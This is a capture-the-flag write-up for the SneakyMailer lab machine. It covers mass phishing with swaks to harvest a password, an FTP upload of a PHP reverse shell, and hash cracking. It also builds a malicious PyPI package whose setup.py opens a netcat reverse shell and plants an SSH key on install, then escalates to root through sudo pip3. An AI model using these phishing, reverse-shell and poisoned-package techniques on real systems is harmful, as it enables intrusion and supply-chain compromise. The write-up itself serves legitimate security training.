## Synopsis

SneakyMailer is a medium difficulty Linux machine that features a phishing scenario, from which
a set of credentials are gained. These credentials provide access to a mailbox, which reveals
another set of credentials to access the FTP service. FTP file upload allows a foothold to be
gained. PyPI server package installation can be exploited to move laterally. Root access can be
obtained by leveraging sudo privileges.

## Reconnaissance

first of all i check the ftp login with anonymously will get `forbbiden` access and let's added `sneakycorp.htb` into host file.

### HTTP

default page on [sneaky.htb](http://sneakycorp.htb/index.php)

![](/assets/img/sneaky/1.png)

get bunch of emails in /team.php

![](/assets/img/sneaky/2.png)

copy all email and paste it into [email-extractor online](https://debounce.io/extract-email-from-text/)

![](/assets/img/sneaky/3.png)

to be honest this box is very straight forward, i will use `swaks` to send email to one user, then i will catch the response using `netcat` on port 80 and `tcpdump`.

sending email with prompt:

```bash
 swaks --to gavinjoyce@sneakymailer.htb --from bunnys666@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.7/" --server $ip
```

i didnt get any responses on `netcat` but `tcpdump` will

![](/assets/img/sneaky/4.png)

the reason might be `gavinjoyce@sneakymailer.htb` user has not click our phising email, we can loop the process using email.txt and start the netcat again to capturing the request.

```bash
swaks --to $(cat email.txt | tr '\n' ',' | less) --from bunnys666@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.7/" --server $ip
```

the result show up on netcat

![](/assets/img/sneaky/6.png)

it can be found that the user is executing our phishing, on the output of `netcat` we have the target email and password. 

```html
firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
```

we can easily decode that HTML encoding using `burpsuite`

![](/assets/img/sneaky/7.png)

```
^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```

tried to login via ssh without any luck

![](/assets/img/sneaky/8.png)

for further enumeration im gonna use `evolution` for email-client, beside this apps allowed us to doing remote connection.

here's my steps to get connected into server:

* install evolution (apt-get install evolution)
* on evolution choose file -> new -> choose mail-account
* identity section input an email

![](/assets/img/sneaky/13.png)

* reciving email section input server and username

![](/assets/img/sneaky/10.png)

* sending email section

![](/assets/img/sneaky/11.png)

* final result

![](/assets/img/sneaky/14.png)

for the last stage we will be asked to fill in the password for user `paulbyrd`.

in this email client we've got 2 emails contain:

![](/assets/img/sneaky/17.png)

* password reset

![](/assets/img/sneaky/18.png)

```
m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
```
* module testing

![](/assets/img/sneaky/19.png)


using this both username paul and developer via ssh still failing

![](/assets/img/sneaky/20.png)

on ftp service we can use credentials as developer

![](/assets/img/sneaky/21.png)

listing directory will determining /dev directory

![](/assets/img/sneaky/22.png)


inside /dev directory finding index.php and css folder, seems like another apps running from another domain. let use `ffuf` for fuzzing sub domain on target

```bash
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://sneakycorp.htb/ -H "Host: FUZZ.sneakycorp.htb" -fw 6
```

as soon we found another sub domain, added into host file

![](/assets/img/sneaky/23.png)

check the browser and see the default page in sneakycorp.htb

![](/assets/img/sneaky/24.png)

here's the things, i tried to put test.html file on ftp service then access it into browser

![](/assets/img/sneaky/25.png)


we able to adding a file in this box, next we can upload reverse-shell.php to gain access into system

![](/assets/img/sneaky/26.png)

## Escalate Low

After reaching this stage, I checked the `/etc/passwd` file to identify some users who have a `/bin/bash` shell on the system.

![](/assets/img/sneaky/28.png)

only 3 users have shells, we have tried logging in via ssh as a developer, and paul and found unsuccessful results. it is certain that we will escalate to user low, I have tried to inject ssh-key in the .ssh directory but it still fails. and in the `www-data` home directory we will find a folder with the name pypi, added pypi subdomain into host file.

![](/assets/img/sneaky/27.png)

dump .htpasswd file and crack this hash using john the ripper

![](/assets/img/sneaky/29.png)

crack the hash using john with following command:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![](/assets/img/sneaky/31.png)


```bash
soufianeelhaoui
```

continuing the process access into browser using port 8080

![](/assets/img/sneaky/30.png)

in short The Python Package Index (PyPI) is a repository of software for the Python programming language. Pypi helps you find and install software developed and shared by the Python community. In this case we're gonna make a malicious package and send it into target, in that package we will insert the rsa key so that we can login as low via ssh.

you can find the documentation about setuptools in this [documentation](https://setuptools.pypa.io/en/latest/userguide/quickstart.html) and [poc in here](https://docs.python.org/3/distutils/setupscript.html).

here's my steps to iniate a malicious package:

```text
mkdir bunnys666
cd bunnys666/
mkdir package

touch README.md (empty file)
touch package/__init__.py (empty file)
touch setup.cfg
touch setup.py
```

![](/assets/img/sneaky/38.png)


inside setup.cfg files:

```
[metadata]
description-file = README.md
```

setup.py contains: 

```python
import setuptools
import os

if os.getuid() == 1000:
	#optional access with netcat
    os.system('nc -e /bin/bash 10.10.14.2 9001')
  #optional access with ssh
    os.system("echo 'ssh-key' >> /home/low/.ssh/authorized_keys")
	

setuptools.setup(
    name="bunnys666",
    version="0.0.1",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description="",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.6",
)
```

touch ~/.pypirc and containing:

```python
[distutils]
index-servers =
  pypi
  remote

[pypi]
username: pypi
password: soufianeelhaoui

[remote]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```

so [pypirc](https://packaging.python.org/en/latest/specifications/pypirc/) files is configuration files for repository, we need to redefine the index-servers field to include the repository name.
upload the package into pypi repository, the following command should be use:

```bash
python3 setup.py sdist register -r remote upload -r remote
```

![](/assets/img/sneaky/34.png)


and now we can try login via ssh with rsa key as low

![](/assets/img/sneaky/35.png)

## Privilege Escalation

as you can see we successfully login as low, and run `sudo -l` command will determining how to obtain root access

![](/assets/img/sneaky/36.png)

we can escalate into root using `pip3`, execute command below will lead you into root 

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip3 install $TF
```
